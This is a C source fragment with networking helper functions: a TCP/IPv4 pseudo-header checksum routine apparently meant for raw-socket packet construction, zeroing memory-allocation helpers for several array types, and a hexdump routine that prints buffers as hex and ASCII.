uint16_t tcp4_checksum(struct ip iphdr, struct tcphdr tcphdr, uint8_t *payload,
                       int payloadlen) {
    uint16_t svalue;
    char buf[IP_MAXPACKET], cvalue;
    char *ptr;
    int i, chksumlen = 0;

    // ptr points to beginning of buffer buf
    ptr = &buf[0];

    // Copy source IP address into buf (32 bits)
    memcpy(ptr, &iphdr.ip_src.s_addr, sizeof(iphdr.ip_src.s_addr));
    ptr += sizeof(iphdr.ip_src.s_addr);
    chksumlen += sizeof(iphdr.ip_src.s_addr);

    // Copy destination IP address into buf (32 bits)
    memcpy(ptr, &iphdr.ip_dst.s_addr, sizeof(iphdr.ip_dst.s_addr));
    ptr += sizeof(iphdr.ip_dst.s_addr);
    chksumlen += sizeof(iphdr.ip_dst.s_addr);

    // Copy zero field to buf (8 bits)
    *ptr = 0;
    ptr++;
    chksumlen += 1;

    // Copy transport layer protocol to buf (8 bits)
    memcpy(ptr, &iphdr.ip_p, sizeof(iphdr.ip_p));
    ptr += sizeof(iphdr.ip_p);
    chksumlen += sizeof(iphdr.ip_p);

    // Copy TCP length to buf (16 bits)
    svalue = htons(sizeof(tcphdr) + payloadlen);
    memcpy(ptr, &svalue, sizeof(svalue));
    ptr += sizeof(svalue);
    chksumlen += sizeof(svalue);

    // Copy TCP source port to buf (16 bits)
    memcpy(ptr, &tcphdr.th_sport, sizeof(tcphdr.th_sport));
    ptr += sizeof(tcphdr.th_sport);
    chksumlen += sizeof(tcphdr.th_sport);

    // Copy TCP destination port to buf (16 bits)
    memcpy(ptr, &tcphdr.th_dport, sizeof(tcphdr.th_dport));
    ptr += sizeof(tcphdr.th_dport);
    chksumlen += sizeof(tcphdr.th_dport);

    // Copy sequence number to buf (32 bits)
    memcpy(ptr, &tcphdr.th_seq, sizeof(tcphdr.th_seq));
    ptr += sizeof(tcphdr.th_seq);
    chksumlen += sizeof(tcphdr.th_seq);

    // Copy acknowledgement number to buf (32 bits)
    memcpy(ptr, &tcphdr.th_ack, sizeof(tcphdr.th_ack));
    ptr += sizeof(tcphdr.th_ack);
    chksumlen += sizeof(tcphdr.th_ack);

    // Copy data offset to buf (4 bits) and
    // copy reserved bits to buf (4 bits)
    cvalue = (tcphdr.th_off << 4) + tcphdr.th_x2;
    memcpy(ptr, &cvalue, sizeof(cvalue));
    ptr += sizeof(cvalue);
    chksumlen += sizeof(cvalue);

    // Copy TCP flags to buf (8 bits)
    memcpy(ptr, &tcphdr.th_flags, sizeof(tcphdr.th_flags));
    ptr += sizeof(tcphdr.th_flags);
    chksumlen += sizeof(tcphdr.th_flags);

    // Copy TCP window size to buf (16 bits)
    memcpy(ptr, &tcphdr.th_win, sizeof(tcphdr.th_win));
    ptr += sizeof(tcphdr.th_win);
    chksumlen += sizeof(tcphdr.th_win);

    // Copy TCP checksum to buf (16 bits)
    // Zero, since we don't know it yet
    *ptr = 0;
    ptr++;
    *ptr = 0;
    ptr++;
    chksumlen += 2;

    // Copy urgent pointer to buf (16 bits)
    memcpy(ptr, &tcphdr.th_urp, sizeof(tcphdr.th_urp));
    ptr += sizeof(tcphdr.th_urp);
    chksumlen += sizeof(tcphdr.th_urp);

    // Copy payload to buf
    memcpy(ptr, payload, payloadlen);
    ptr += payloadlen;
    chksumlen += payloadlen;

    // Pad to the next 16-bit boundary
    for (i = 0; i < payloadlen % 2; i++, ptr++) {
        *ptr = 0;
        ptr++;
        chksumlen++;
    }

    return checksum((uint16_t *)buf, chksumlen);
}

// Allocate memory for an array of chars.
char *allocate_strmem(int len) {
    char *tmp;

    if (len <= 0) {
        dbg_printf("ERROR: Cannot allocate memory because len = %i in "
                   "allocate_strmem().\n",
                   len);
        exit(EXIT_FAILURE);
    }

    tmp = (char *)malloc(len * sizeof(char));
    if (tmp != NULL) {
        memset(tmp, 0, len * sizeof(char));
        return (tmp);
    } else {
        dbg_printf(
            "ERROR: Cannot allocate memory for array allocate_strmem().\n");
        exit(EXIT_FAILURE);
    }
}

// Allocate memory for an array of unsigned chars.
uint8_t *allocate_ustrmem(int len) {
    uint8_t *tmp;

    if (len <= 0) {
        dbg_printf("ERROR: Cannot allocate memory because len = %i in "
                   "allocate_ustrmem().\n",
                   len);
        exit(EXIT_FAILURE);
    }

    tmp = (uint8_t *)malloc(len * sizeof(uint8_t));
    if (tmp != NULL) {
        memset(tmp, 0, len * sizeof(uint8_t));
        return (tmp);
    } else {
        dbg_printf(
            "ERROR: Cannot allocate memory for array allocate_ustrmem().\n");
        exit(EXIT_FAILURE);
    }
}

// Allocate memory for an array of ints.
int *allocate_intmem(int len) {
    int *tmp;

    if (len <= 0) {
        dbg_printf("ERROR: Cannot allocate memory because len = %i in "
                   "allocate_intmem().\n",
                   len);
        exit(EXIT_FAILURE);
    }

    tmp = (int *)malloc(len * sizeof(int));
    if (tmp != NULL) {
        memset(tmp, 0, len * sizeof(int));
        return (tmp);
    } else {
        dbg_printf(
            "ERROR: Cannot allocate memory for array allocate_intmem().\n");
        exit(EXIT_FAILURE);
    }
}

void hexdump(const char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char *)addr;

    // Output description if given.
    if (desc != NULL)
        printf("%s:\n", desc);
    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        printf("  NEGATIVE LENGTH: %i\n", len);
        return;
    }

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).
        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf("  %s\n", buff);
            // Output the offset.
            printf("  %04x ", i);
        }
        // Now the hex code for the specific character.
        printf(" %02x", pc[i]);
        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }
    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf("   ");
        i++;
    }
    // And print the final ASCII bit.
    printf("  %s\n", buff);
}
